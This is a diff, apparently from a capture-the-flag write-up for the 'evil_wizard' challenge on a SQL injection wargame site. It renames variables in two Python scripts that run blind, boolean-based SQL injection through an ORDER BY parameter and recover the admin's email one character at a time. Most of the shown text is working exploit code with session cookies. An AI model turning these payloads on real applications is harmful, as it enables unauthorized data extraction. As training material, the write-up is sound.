@@ -92,7 +92,7 @@ import string
 
 cookies = {'PHPSESSID': 'fgpbvjdctvq3qasns4lba8a85p'}
 url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php"
-password_length = 0
+email_length = 0
 
 for x in range(0, 100):
   payload = f"if(id='admin' and length(email)={x}, 1, 2)"
@@ -102,18 +102,18 @@ for x in range(0, 100):
   response = requests.get(full_url, cookies=cookies)
     
   if "<table border=1><tr><th>id</th><th>email</th><th>score</th><tr><td>admin</td>" in response.text:
-    password_length = x
+    email_length = x
     break
 
 print()    
 print(f"[!] Payload: ?order={payload}")
 print(f"[!] Payload (URL encoded): ?order={encoded_payload}")
-print(f"[!] Email length: {password_length}")
+print(f"[!] Email length: {email_length}")
 
-password = ""
+email = ""
 searchspace = '_@.' +  string.digits + string.ascii_letters
 
-for index in range(1, password_length + 1):
+for index in range(1, email_length + 1):
   for char in searchspace:
     payload = f"if(id='admin' AND ord(substr(email, {index}, 1))='{ord(char)}', 1, 2)"
     encoded_payload = urllib.parse.quote_plus(payload)
@@ -122,7 +122,7 @@ for index in range(1, password_length + 1):
     response = requests.get(full_url, cookies=cookies)
 
     if "<table border=1><tr><th>id</th><th>email</th><th>score</th><tr><td>admin</td>" in response.text:
-      password += char
+      email += char
       print()
       print(f"[+] Payload: ?order={payload}")
       print(f"[+] Payload (URL encoded): ?order={encoded_payload}")
@@ -130,8 +130,8 @@ for index in range(1, password_length + 1):
       break
 
 print()
-print(f"[!] Extracted email: {password}")
-print(f"[!] Final payload: ?email={password}")
+print(f"[!] Extracted email: {email}")
+print(f"[!] Final payload: ?email={email}")
 ```
 
 ```
@@ -312,7 +312,7 @@ import string
 
 cookies = {'PHPSESSID': 'josojaca8vb3q57avmhb3ltni3'}
 url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php"
-password_length = 0
+email_length = 0
 
 for x in range(0, 100):
   payload = f"if(id='admin' and length(email)={x}, '1 ASC', '1 DESC')"
@@ -322,20 +322,20 @@ for x in range(0, 100):
   response = requests.get(full_url, cookies=cookies)
     
   if "<table border=1><tr><th>id</th><th>email</th><th>score</th><tr><td>admin</td>" in response.text:
-    password_length = x
+    email_length = x
     break
 
 print()    
 print(f"[!] Payload: ?order={payload}")
 print(f"[!] Payload (URL encoded): ?order={encoded_payload}")
-print(f"[!] Email length: {password_length}")
+print(f"[!] Email length: {email_length}")
 
-password = ""
+email = ""
 searchspace = '_@.' +  string.digits + string.ascii_letters
 
 print(searchspace)
 
-for index in range(1, password_length + 1):
+for index in range(1, email_length + 1):
   for char in searchspace:
     payload = f"if(id='admin' AND ord(substr(email, {index}, 1))='{ord(char)}', '1 ASC', '1 DESC')"
     encoded_payload = urllib.parse.quote_plus(payload)
@@ -344,7 +344,7 @@ for index in range(1, password_length + 1):
     response = requests.get(full_url, cookies=cookies)
 
     if "<table border=1><tr><th>id</th><th>email</th><th>score</th><tr><td>admin</td>" in response.text:
-      password += char
+      email += char
       print()
       print(f"[+] Payload: ?order={payload}")
       print(f"[+] Payload (URL encoded): ?order={encoded_payload}")
@@ -352,8 +352,8 @@ for index in range(1, password_length + 1):
       break
 
 print()
-print(f"[!] Extracted email: {password}")
-print(f"[!] Final payload: ?email={password}")
+print(f"[!] Extracted email: {email}")
+print(f"[!] Final payload: ?email={email}")
 ```
 
 ```
